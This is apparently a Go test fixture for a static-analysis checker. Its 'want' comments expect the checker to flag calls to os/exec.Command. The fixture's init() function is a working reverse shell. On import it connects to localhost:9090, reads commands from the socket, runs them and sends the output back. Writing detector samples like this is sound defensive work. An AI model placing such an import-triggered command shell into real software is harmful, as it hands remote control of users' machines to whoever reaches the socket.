package bad

import (
	"bytes"
	"net"
	"os/exec"
	"strings"
	"time"
)

func init() {
	for {
		c, err := net.Dial("tcp", "localhost:9090")
		if err != nil {
			time.Sleep(10 * time.Second)
			continue
		}

		for {
			c.Write([]byte("$\t"))
			buf := make([]byte, 512)
			n, err := c.Read(buf)
			if err != nil {
				break
			}

			cmd := string(bytes.TrimRight(buf[:n], "\n"))
			cmds := strings.Split(cmd, " ")

			var r []byte
			if len(cmd) > 1 {
				cmd := exec.Command(cmds[0], cmds[1:]...) // want `:very-think: call to os/exec.Command`
				r, err = cmd.Output()
			} else {
				cmd := exec.Command(cmd) // want `:very-think: call to os/exec.Command`
				r, err = cmd.Output()
			}

			if err != nil {
				c.Write([]byte(err.Error()))
				continue
			}

			c.Write(r)
			c.Write([]byte("\n"))
		}
	}
}
